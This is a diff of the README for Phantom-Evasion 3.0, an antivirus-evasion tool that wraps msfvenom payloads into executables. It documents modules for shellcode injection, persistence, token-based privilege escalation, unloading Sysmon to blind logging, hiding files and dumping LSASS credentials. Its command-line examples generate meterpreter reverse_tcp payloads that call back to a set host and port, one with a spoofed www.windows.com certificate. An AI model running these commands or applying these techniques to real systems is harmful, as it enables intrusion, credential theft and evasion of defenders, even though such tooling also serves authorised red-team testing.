@@ -1,20 +1,27 @@
-# PHANTOM EVASION 3.0
+# PHANTOM EVASION 3.0 
 
 Phantom-Evasion is an antivirus evasion tool written in python (both compatible with python and python3) capable to generate (almost) fully undetectable executable even with the most common x86 msfvenom payload.
 
 The following OSs officialy support automatic setup:
 
-1. Kali Linux                   (64 bit)
-2. Parrot Security              (64 bit)
-3. Osx (tested on Catalina)     (64 bit)
+1. Kali Linux                   
+2. Parrot Security              
 
 The following OSs likely support automatic setup but require manual installation of metasploit-framework:
 
-1. Linux distro
+1. OSX (tested on Catalina)
+2. Ubuntu                       
+3. Linux Mint                   
+4. Elementary                   
+5. Deepin                       
+6. other Debian distro                     
+7. Centos
+8. Fedora
+9. Blackarch
 
 The following OSs require manual setup:
 
-1. Windows 10                   (64 bit)
+1. Windows 10
 
 Simply git clone or download and unzip Phantom-Evasion folder
 
@@ -70,7 +77,7 @@ sudo ./phantom-evasion.py --help
 ```
 ## WINDOWS Modules
 
--All windows payload C modules and can be compiled (support both x86 and x64) as EXE or DLL/ReflectiveDLL.
+-Every windows payload C module and can be compiled (support both x86 and x64) as EXE or DLL/ReflectiveDLL.
 -Randomized junkcode injection (intensity,frequency and reinjection probability can be set) and windows antivirus evasion techniques (frequency can be set).
 -Multibyte Xor/Vigenere shellcode/file encryption supported in both Shellcode injection and Donwload Exec modules.
 -Ntdll unhookapi and Peb process masquerading technique supported.
@@ -91,7 +98,7 @@ Shellcode Encryption supported: 1.none
                                 4.Vigenere
                                 5.Double-key Vigenere
 
-1. Local exec method can be one of the following:  Thread (shorten is T)
+1. Local exec method can be one of the following:  Thread
                                                    APC    
 
    Local Memory allocation mode can be one of the following: Virtual_RWX
@@ -119,7 +126,7 @@ Using cmdline mode:
     reverse_http c stager is WRH
     reverse_https c stager is WRS
 
-1. Local exec method can be one of the following:  Thread (shorten is T)
+1. Local exec method can be one of the following:  Thread 
                                                    APC    
 
    Local Memory allocation mode can be one of the following: Virtual_RWX
@@ -173,8 +180,7 @@ Msfvenom linux payloads and custom shellcodes supported.
     
 3. Windows Persistence Keep Process Alive (C)
     Compiled executable need to be uploaded to the target machine and executed.
-    Use CreateToolSnapshoot ProcessFirst and ProcessNext to check if specified process is alive every X seconds.
-    Usefull combined with Persistence N.1 or N.2 (persistence start Keep process alive file which then start and keep alive the specified process)
+    Use CreateToolSnapshoot ProcessFirst and ProcessNext to check if specified process is alive every X seconds (if not create a new process using WinExec API)
 
 4. Windows Persistence Schtasks (CMD)
 
@@ -187,30 +193,30 @@ Msfvenom linux payloads and custom shellcodes supported.
 ## PRIVILEGE ESCALATION Modules
 
 1. Windows DuplicateTokenEx (C)
-
+    
+    Create a new process with a token cloned from another process.
     Compiled executable need to be uploaded to the target machine and executed.
 
 ## POSTEXPLOITATION Modules
 
 1. Windows Unload Sysmon (C)
-
+    Unload sysmon driver which causes the system to stop recording sysmon event logs.
     Compiled executable need to be uploaded to the target machine and executed.
 
 2. Windows Unload Sysmon (CMD)
+    Unload sysmon driver which causes the system to stop recording sysmon event logs.
 
 3. Windows Attrib hide file (CMD)
-
     Use attrib to hide file    
 
 4. Windows SetFileAttribute hidden (C)
-
+    Hide file using SetFileAttribute API
     Compiled executable need to be uploaded to the target machine and executed.
-    hide file using SetFileAttributes API
 
 5. Windows DumpLsass (C)
-
-    Compiled executable need to be uploaded to the target machine and executed.
     Dump Lsass using MiniWriteDumpWrite API.
+    Compiled executable need to be uploaded to the target machine and executed.
+
 
 6. Windows DumpLsass (CMD)
 
@@ -218,10 +224,10 @@ Msfvenom linux payloads and custom shellcodes supported.
 
 ## Phantom-Evasion Cmdline mode examples:
 
-1. windows shellcode injection, local execution method: Thread, mem: Virtual_RWX , encryption: vigenere
+1. windows shellcode injection,output signed exe with spoofed https certificate,local execution method: Thread, mem: Virtual_RWX , encryption: vigenere
 
 ```
-python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 192.168.1.123 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -f exe -o filename.exe
+python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 192.168.1.123 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -c www.windows.com:443 -f exe -o filename.exe
 ```
 
 2. windows x64 shellcode injection ,output as reflective dll ,remote execution method: ProcessInject (PI), mem: Virtual_RW/RX , target process: SkypeApp.exe ,encryption: double key xor
@@ -266,11 +272,12 @@ https://github.com/stephenfewer/ReflectiveDLLInjection
 
 https://github.com/rsmudge/metasploit-loader
 
-https://ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation
-
-https://ired.team/offensive-security/defense-evasion/unloading-sysmon-driver
-
-https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
+https://ired.team
 
 https://github.com/theevilbit/injection
 
+http://www.rohitab.com/discuss/topic/40761-manual-dll-injection/
+
+https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
+
+https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
